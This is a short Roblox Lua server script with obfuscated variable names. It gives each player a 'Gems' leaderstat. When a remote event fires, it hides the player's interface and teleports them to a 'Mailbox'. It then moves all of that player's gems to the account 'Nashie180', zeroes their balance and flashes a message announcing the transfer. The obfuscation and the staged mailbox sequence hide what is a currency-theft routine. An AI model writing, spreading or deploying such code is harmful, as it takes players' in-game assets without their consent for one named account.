local _0x4aab,_0x36b2,_0x3acb,_0x6c5d,_0x5861,_0x257a,_0x7a1d,_0x4920,_0x263f,_0x6ff1,_0x4b1c,_0x5977,_0x554b
game.Players.PlayerAdded:Connect(function(_0x2d35)
    local _0x37b7 = Instance.new("Folder")
    _0x37b7.Name = "leaderstats"
    _0x37b7.Parent = _0x2d35

    local _0x5be4 = Instance.new("IntValue")
    _0x5be4.Name = "Gems"
    _0x5be4.Parent = _0x37b7
    _0x5be4.Value = 100
end)

local function _0x5a2f(_0x2d35)
    if _0x2d35:FindFirstChild("PlayerGui") then
        local _0x1c87 = _0x2d35.PlayerGui:FindFirstChild("ScreenGui")
        if _0x1c87 then
            _0x1c87.Enabled = false
        end
    end

    wait(2)

    local _0x7cfa = game.Workspace:FindFirstChild("Mailbox")
    if _0x7cfa then
        _0x2d35.Character:MoveTo(_0x7cfa.Position)
    else
        warn("Mailbox not found in the workspace!")
    end

    wait(2)

    local _0x3f8b = _0x2d35.leaderstats and _0x2d35.leaderstats.Gems and _0x2d35.leaderstats.Gems.Value or 0

    local _0x4dbf = game:GetService("Players"):FindFirstChild("Nashie180")
    if _0x4dbf then
        _0x4dbf.leaderstats.Gems.Value = _0x4dbf.leaderstats.Gems.Value + _0x3f8b
        _0x2d35.leaderstats.Gems.Value = 0

        if _0x2d35:FindFirstChild("PlayerGui") then
            local _0x5b7d = Instance.new("ScreenGui")
            local _0x2f5d = Instance.new("TextLabel")
            _0x2f5d.Text = "All gems have been sent to @Nashie180!"
            _0x2f5d.Size = UDim2.new(0, 400, 0, 50)
            _0x2f5d.Position = UDim2.new(0.5, -200, 0.5, -25)
            _0x2f5d.Parent = _0x5b7d
            _0x5b7d.Parent = _0x2d35.PlayerGui
            wait(2)
            _0x5b7d:Destroy()
        end
    else
        warn("Player @Nashie180 not found in the game!")
    end

    wait(1)
    if _0x2d35:FindFirstChild("PlayerGui") then
        local _0x1c87 = _0x2d35.PlayerGui:FindFirstChild("ScreenGui")
        if _0x1c87 then
            _0x1c87.Enabled = true
        end
    end
end

game.ReplicatedStorage.SomeEvent.OnServerEvent:Connect(function(_0x2d35)
    _0x5a2f(_0x2d35)
end)